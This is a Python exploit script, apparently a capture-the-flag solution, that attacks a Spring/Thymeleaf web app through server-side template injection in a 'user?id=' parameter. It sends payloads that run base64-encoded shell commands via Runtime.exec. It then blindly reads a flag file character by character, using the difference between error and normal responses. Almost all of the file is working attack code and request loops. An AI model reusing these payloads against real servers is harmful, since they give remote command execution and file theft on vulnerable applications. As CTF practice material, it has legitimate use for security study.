import requests
import string
import base64

payload = "__${T(java.lang.Runtime).getRuntime().exec(new String(T(org.springframework.util.Base64Utils).decodeFromString('ZWNobyAidGVzdCIgPiAvdG1wL3Rlc3Q=')))}__::main"
url = "http://localhost:8080/user?id="+payload
print(payload)
res = requests.get(url=url)
payload = "__${T(java.lang.Runtime).getRuntime().exec(new String(T(org.springframework.util.Base64Utils).decodeFromString('bHMgfCB0b3VjaCAvdG1wL3Rlc3Q=')))}__::main"
url = "http://localhost:8080/user?id="+payload
print(payload)
res = requests.get(url=url)

text = ""

enter = 0
while True:
    index = 0
    flag = True
    while flag:
        for i in " 0123456789x,abcdefghijklmnopqrstuvwyzABCDEFGHIJKLMNOPQRSTUVWXYZ"+r"""!"#$%&'()*+-./:;<=>?@[\]^_`{|}~"""+'\n':
            payload = "__${T(org.springframework.util.Base64Utils).encodeToString(T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/flag.c')).get("+str(enter)+").charAt("+str(index)+")).compareTo('"+base64.b64encode(i.encode()).decode()+"') == 0 ? 'admin':'no'}__::main"
            print(i,payload)
        #payload = "__${'admin' == 'admina' ? 'Matched' : 'Not Matched'}__::main"
            url = "http://host1.dreamhack.games:12071/user?id="+payload

        #url = "http://localhost:8080/error_page?status==__${T(java.lang.Runtime).getRuntime().exec(\"ls\")}__::"
            res = requests.get(url=url)
            if i == '\n':
                text += '\n'
                print(text)
                flag = False
            if "<span>500</span></p>" not in res.text:
                text += i
                print(text)
                break
            
        index += 1
    enter += 1
        
    

# for i in string.printable:
#     res = requests.get(url+str(i))
#     if res.status_code == 200:
#         print(i)

# ''.getClass().forName('java.lang.Runtime')).exec('ls')